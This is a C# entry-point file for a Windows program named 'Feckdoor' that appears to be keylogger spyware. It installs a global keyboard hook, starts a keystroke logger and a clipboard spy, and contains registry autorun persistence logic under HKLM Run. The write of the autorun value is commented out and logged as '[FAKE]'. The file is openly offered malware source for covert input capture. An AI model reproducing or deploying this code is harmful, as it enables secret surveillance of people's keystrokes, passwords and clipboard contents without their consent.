using System.Text;
using System.Text.Json;
using System.Reflection;
using Microsoft.Win32;
using Serilog;
using System.Text.Json.Serialization;
using Feckdoor.InputLog;

namespace Feckdoor
{
	internal static class Program
	{
		private static KeyboardLogger InputLog = null!;
		private static KillswitchHandler Killswitch = null!;
		private static ClipboardSpy ClipSpy = null!;

		private static bool disposed = false;

		private static JsonSerializerOptions jsonOptions = new JsonSerializerOptions
		{
			WriteIndented = true,
			Converters = { new JsonStringEnumConverter(JsonNamingPolicy.CamelCase) }
		};

		[STAThread]
		static void Main(string[] args)
		{
			try
			{
				Config.TheConfig = new Config();

				if (LoadConfig(args))
					return;

				try
				{
					Log.Logger = new LoggerConfiguration().MinimumLevel.Debug().WriteTo.File(string.Format(Config.TheConfig.ProgramLogFile, DateTime.Now), outputTemplate: Config.TheConfig.LogTemplate, buffered: true, flushToDiskInterval: TimeSpan.FromMilliseconds(Config.TheConfig.LogFlushInterval), fileSizeLimitBytes: Config.TheConfig.LogRollingSize, encoding: Encoding.UTF8, rollOnFileSizeLimit: true).CreateLogger();
				}
				catch (Exception e)
				{
					MessageBox.Show($"Exception during logger initialization.{Environment.NewLine}{e}", "Startup failure", MessageBoxButtons.OK, MessageBoxIcon.Error);
					return;
				}
				Log.Information("Hello, world!");

				var generatedCfg = (from arg in args where arg.StartsWith("-gencfg", StringComparison.OrdinalIgnoreCase) select arg.Skip(7 /* "-gencfg".Length */)).FirstOrDefault();
				if (generatedCfg != null)
				{
					GenerateDefaultConfig(string.Concat(generatedCfg));
					return;
				}

				if (ApplyAutorun(args))
					return;

				// https://stackoverflow.com/questions/1842077/how-to-call-event-before-environment-exit
				AppDomain.CurrentDomain.UnhandledException += OnShutdown;
				AppDomain.CurrentDomain.ProcessExit += OnShutdown;
				AppDomain.CurrentDomain.DomainUnload += OnShutdown;

				// Initialize hooks
				InputLogWriter.Initialize();
				KeyboardHook.InstallHook();

				// Initialize modules
				InputLog = new KeyboardLogger();
				Killswitch = new KillswitchHandler();
				ClipSpy = new ClipboardSpy();

				Application.Run();
			}
			catch (Exception ex)
			{
				Log.Fatal("Exception on main thread.", ex);
			}
		}

		private static void GenerateDefaultConfig(string name)
		{
			try
			{
				string configFile = "config.json";
				if (name.Length > 1)
					configFile = name;

				configFile = Path.GetFullPath(configFile);
				if (new FileInfo(configFile).Exists)
				{
					Log.Error("File {LogFile} already exists.", configFile);
					return;
				}

				File.WriteAllText(configFile, JsonSerializer.Serialize(Config.TheConfig, jsonOptions));
				Log.Information("Generating default configuration file to {file} and exit.", configFile);
			}
			catch (Exception e)
			{
				Log.Error(e, "Exception during config generation.");
			}
		}

		private static bool LoadConfig(string[] args)
		{
			// NOTE: Can't use logger here as it is not initialized yet.
			try
			{
				string configFile = "config.json";
				string? custom = (from arg in args where arg.StartsWith("-cfg", StringComparison.OrdinalIgnoreCase) select arg.Skip(4 /* "-cfg".Length */)).FirstOrDefault()?.ToString();
				if (custom != null && new FileInfo(custom).Exists)
					configFile = custom;

				string configPath = Path.GetFullPath(configFile);
				if (File.Exists(configPath))
				{
					var tmp = JsonSerializer.Deserialize<Config>(File.ReadAllText(configPath), jsonOptions);
					if (tmp != null)
						Config.TheConfig = tmp;
				}

				return false;
			}
			catch (Exception e)
			{
				MessageBox.Show($"Exception during loading configuration.{Environment.NewLine}{e}", "Startup failure", MessageBoxButtons.OK, MessageBoxIcon.Error);
				return true;
			}
		}

		internal static void OnShutdown(object? sender, EventArgs e)
		{
			Shutdown();
		}

		public static void Shutdown()
		{
			if (disposed)
				return;
			try
			{
				InputLogWriter.Shutdown();
				KeyboardHook.UninstallHook();
				InputLog.Dispose();
				Killswitch.Dispose();
				ClipSpy.Dispose();
				disposed = true;
				Log.Information("Resource disposal fininshed. Bye!");
				Application.Exit();
				Log.CloseAndFlush();
			}
			catch (Exception e)
			{
				Log.Warning(e, "Exception during disposal.");
			}
		}

		private static bool ApplyAutorun(string[] args)
		{
			try
			{
				string autorunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
				string autorunValue = Config.TheConfig.RegistryAutorunName;
				string autorunPath = $"{autorunKey}{Path.DirectorySeparatorChar}{autorunValue}"; // Only used for logging
				if (args.Any(arg => arg.Equals("-delautorun", StringComparison.OrdinalIgnoreCase)))
				{
					if (Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
					{
						Log.Warning("Autorun entry not found on {location}", autorunPath);
					}
					else
					{
						Registry.LocalMachine.CreateSubKey(autorunKey)?.DeleteValue(autorunValue);
						Log.Information("Removed autorun entry from {location}", autorunPath);
					}
					return true;
				}

				string? exepath = Assembly.GetEntryAssembly()?.Location ?? Assembly.GetExecutingAssembly()?.Location;
				if (exepath != null && Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
				{
					// Registry.LocalMachine.CreateSubKey(autorunKey)?.SetValue(autorunValue, exepath);
					Log.Information("[FAKE]Added autorun entry to {location}", autorunPath);
				}
			}
			catch (Exception e)
			{
				Log.Warning(e, "Exception during writing autorun entry to registry.");
			}

			return false;
		}


	}
}